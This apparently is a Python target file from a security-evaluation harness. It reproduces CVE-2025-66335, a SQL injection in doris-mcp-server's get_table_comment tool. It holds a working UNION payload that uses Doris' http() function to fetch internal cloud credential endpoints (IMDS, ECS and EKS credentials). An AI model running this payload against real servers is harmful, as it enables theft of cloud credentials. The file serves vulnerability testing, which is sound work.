"""CVE-2025-66335: doris-mcp-server SQL identifier injection reaching internal_fetch (CWE-89).

The metadata tools interpolate the caller-controlled identifier (table_name / db_name) into an
information_schema query with no validation (<= 0.6.0). get_table_comment runs a
`... WHERE TABLE_SCHEMA='{db}' AND TABLE_NAME='{table}'` query, so a table_name of
`x' UNION SELECT c1 FROM http("uri"="http://<internal>","format"="csv") -- `
closes the predicate and runs arbitrary SQL. Doris' http() table-valued function then fetches the
attacker-chosen internal URL from the Doris backend and returns the body in the tool response:
reach = internal_fetch. 0.6.1 adds validate_identifier (PR #68), which rejects the injected
identifier with "Invalid table name" before the query is built, so no nonce surfaces.

doris-mcp-server never fetches these endpoints itself; only the SQL injection -> http() TVF reaches
them. The arbitrary_read reach does not surface a place (Doris' local() TVF is confined to
user_files_secure_path and rejects '..'), and command_execution is not reachable, so every kept
place is an http_endpoint.
"""

import re
from collections.abc import Awaitable, Callable

from evals.cve_environments import DORIS_DB, doris_db_env
from evals.cve_grammar import MechanismClass
from evals.cve_places import Place, Places
from evals.cve_planting import PlantingHost, SymbolicUser
from evals.cve_targets import CVETarget
from evals.doris_backend import DORIS_IMAGE, MYSQL_CLIENT_IMAGE
from mcp_auditor.domain.ports import MCPClientPort

# An exploit is aimed when its SQL carries Doris' http() TVF; the benign metadata read does not.
AIM = re.compile(r'http\(\s*"uri"')

KEPT_PLACES: tuple[str, ...] = ("imds", "ecs-task-credentials", "eks-pod-identity")


def _inject_call(place: Place) -> dict[str, str]:
    url = f"http://{place.coordinates.host}{place.coordinates.path}"
    payload = f'x\' UNION SELECT c1 FROM http("uri"="{url}","format"="csv") -- '
    return {"table_name": payload, "db_name": DORIS_DB}


def _exploit(place_id: str) -> Callable[[Places, MCPClientPort], Awaitable[None]]:
    async def run(places: Places, client: MCPClientPort) -> None:
        await client.call_tool("get_table_comment", _inject_call(places[place_id]))

    return run


async def _benign(places: Places, client: MCPClientPort) -> None:
    await client.call_tool("get_table_comment", {"table_name": "t1", "db_name": DORIS_DB})


TARGET = CVETarget(
    cve_id="CVE-2025-66335",
    severity="CVSS 7.5 (v3.1, placeholder)",
    mechanism=MechanismClass.INTERNAL_FETCH,
    aim=AIM,
    reaches=frozenset({"internal_fetch"}),
    kept_places=KEPT_PLACES,
    images=("holdout-2025-66335-doris", "sentinel"),
    server_image="holdout-2025-66335-doris",
    patched_image="holdout-2025-66335-doris-patched",
    planting_host=PlantingHost(SymbolicUser.HOST, "/", has_network=True),
    builder=doris_db_env,
    exploits=tuple(_exploit(place_id) for place_id in KEPT_PLACES),
    benign=_benign,
    awaited_capability=None,
    note=(
        "SQL identifier injection (CWE-89): an unvalidated table_name in get_table_comment is "
        "concatenated into an information_schema query, and a UNION with Doris' http() TVF fetches "
        "an attacker-chosen internal URL and returns its body in the tool response."
    ),
    tools_filter=None,
    backend_images=(DORIS_IMAGE, MYSQL_CLIENT_IMAGE),
)
